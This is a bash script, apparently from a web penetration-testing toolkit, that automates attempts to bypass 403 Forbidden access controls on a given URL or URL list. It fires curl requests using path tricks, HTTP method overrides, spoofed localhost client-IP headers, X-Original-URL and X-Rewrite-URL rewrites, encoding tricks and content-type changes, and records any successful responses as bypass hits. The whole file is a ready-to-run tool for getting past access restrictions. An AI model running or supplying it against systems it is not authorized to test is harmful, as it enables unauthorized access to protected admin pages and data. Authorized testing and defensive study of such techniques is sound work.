#!/usr/bin/env bash
# 403 Forbidden bypass techniques
# Usage: ./scripts/bypass_403.sh -u https://example.com/admin

set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info()    { echo -e "${CYAN}[*]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
hit()     { echo -e "${RED}[HIT]${NC} $*"; }

TARGET_URL=""
URLS_FILE=""
OUTPUT_DIR="output/bypass403_$(date +%Y%m%d_%H%M%S)"

usage() {
    cat <<EOF
Usage: $0 -u <url> [options]
       $0 -l <403_urls_file>

Options:
  -u  Single target URL
  -l  File with list of 403 URLs
  -o  Output directory
  -h  Help

Example:
  $0 -u https://example.com/admin
  $0 -l output/example.com_*/ffuf/403_urls.txt
EOF
    exit 0
}

while getopts "u:l:o:h" opt; do
    case $opt in
        u) TARGET_URL="$OPTARG" ;;
        l) URLS_FILE="$OPTARG" ;;
        o) OUTPUT_DIR="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

[[ -z "$TARGET_URL" && -z "$URLS_FILE" ]] && error() { echo -e "${RED}[-]${NC} $*"; exit 1; } && error "URL required. Use -u or -l"
mkdir -p "$OUTPUT_DIR"

HITS="$OUTPUT_DIR/bypass_hits.txt"

# ─── CORE BYPASS FUNCTION ────────────────────────────
try_bypass() {
    local url="$1"
    local base host path

    # Parse URL
    host=$(echo "$url" | grep -oE 'https?://[^/]+')
    path=$(echo "$url" | sed "s|${host}||")
    [[ -z "$path" ]] && path="/"

    local filename
    filename=$(echo "${path##*/}")
    local dir
    dir=$(echo "${path%/*}")
    [[ -z "$dir" ]] && dir="/"

    echo ""
    info "Testing: $url"
    echo "─────────────────────────────────────────"

    check() {
        local label="$1"
        local test_url="$2"
        local extra_args="${3:-}"

        local code
        # shellcheck disable=SC2086
        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 $extra_args "$test_url" 2>/dev/null || echo "000")

        if [[ "$code" == "200" || "$code" == "201" || "$code" == "204" ]]; then
            hit "[$code] $label → $test_url $extra_args"
            echo "[$code] $label → $test_url $extra_args" >> "$HITS"
        elif [[ "$code" != "403" && "$code" != "404" && "$code" != "000" ]]; then
            warn "[$code] $label → $test_url"
        fi
    }

    # ── Path Manipulation ──────────────────────────────
    check "Path: /./" "${host}/${path#/}" "-X GET"
    check "Path: double slash"     "${host}//${path#/}"
    check "Path: trailing dot"     "${url}."
    check "Path: trailing slash"   "${url}/"
    check "Path: %2f"              "${host}/%2f${path#/}"
    check "Path: ..;/"             "${host}/..;${path}"
    check "Path: /./path"          "${host}/.${path}"
    check "Path: UPPERCASE"        "${host}/${path^^}"
    [[ -n "$filename" ]] && check "Path: dir/../path"  "${host}${dir}/${filename}/../${filename}"

    # ── HTTP Method Override ───────────────────────────
    check "Method: HEAD"           "$url" "-X HEAD"
    check "Method: POST"           "$url" "-X POST"
    check "Method: PUT"            "$url" "-X PUT"
    check "Method: PATCH"          "$url" "-X PATCH"
    check "Method: OPTIONS"        "$url" "-X OPTIONS"
    check "Method: TRACE"          "$url" "-X TRACE"
    check "Header: X-HTTP-Method-Override: GET" "$url" '-H "X-HTTP-Method-Override: GET"'
    check "Header: X-Method-Override: GET"      "$url" '-H "X-Method-Override: GET"'

    # ── IP-based Headers ───────────────────────────────
    for ip in "127.0.0.1" "localhost" "0.0.0.0" "::1"; do
        check "Header: X-Forwarded-For: $ip"  "$url" "-H 'X-Forwarded-For: $ip'"
        check "Header: X-Real-IP: $ip"         "$url" "-H 'X-Real-IP: $ip'"
        check "Header: X-Remote-IP: $ip"       "$url" "-H 'X-Remote-IP: $ip'"
        check "Header: X-Client-IP: $ip"       "$url" "-H 'X-Client-IP: $ip'"
        check "Header: True-Client-IP: $ip"    "$url" "-H 'True-Client-IP: $ip'"
        check "Header: CF-Connecting-IP: $ip"  "$url" "-H 'CF-Connecting-IP: $ip'"
    done

    # ── Proxy / Port Headers ───────────────────────────
    check "Header: X-Forwarded-Host: localhost"  "$url" '-H "X-Forwarded-Host: localhost"'
    check "Header: X-Original-URL: $path"        "$url" "-H 'X-Original-URL: ${path}'"
    check "Header: X-Rewrite-URL: $path"         "$url" "-H 'X-Rewrite-URL: ${path}'"
    check "Header: X-Custom-IP-Authorization: 127.0.0.1" "$url" '-H "X-Custom-IP-Authorization: 127.0.0.1"'

    # ── URL Encoding Tricks ────────────────────────────
    local encoded_path
    encoded_path=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${path}', safe='/'))" 2>/dev/null || true)
    [[ -n "$encoded_path" && "$encoded_path" != "$path" ]] && \
        check "URL: double encoded" "${host}${encoded_path}"

    local path_unicode
    # Replace first char with unicode lookalike
    path_unicode=$(echo "$path" | sed 's|/a|/%EF%BC%8F|' 2>/dev/null || true)
    [[ -n "$path_unicode" && "$path_unicode" != "$path" ]] && \
        check "URL: unicode path" "${host}${path_unicode}"

    # ── Content-Type tricks ───────────────────────────
    check "Content-Type: json"  "$url" '-X POST -H "Content-Type: application/json" -d "{}"'
    check "Content-Type: xml"   "$url" '-X POST -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?>"'

    echo ""
}

# ─── RUN AGAINST TARGETS ─────────────────────────────
if [[ -n "$TARGET_URL" ]]; then
    try_bypass "$TARGET_URL"
elif [[ -n "$URLS_FILE" ]]; then
    [[ ! -f "$URLS_FILE" ]] && echo "File not found: $URLS_FILE" && exit 1
    while IFS= read -r url; do
        [[ -z "$url" || "$url" == "#"* ]] && continue
        try_bypass "$url"
    done < "$URLS_FILE"
fi

# ─── SUMMARY ─────────────────────────────────────────
HITS_COUNT=$(wc -l < "$HITS" 2>/dev/null || echo 0)
echo "=================================================="
if [[ "$HITS_COUNT" -gt 0 ]]; then
    success "BYPASS FOUND: $HITS_COUNT hits → $HITS"
    cat "$HITS"
else
    info "No bypasses found. Endpoint probably properly restricted."
fi
echo "=================================================="
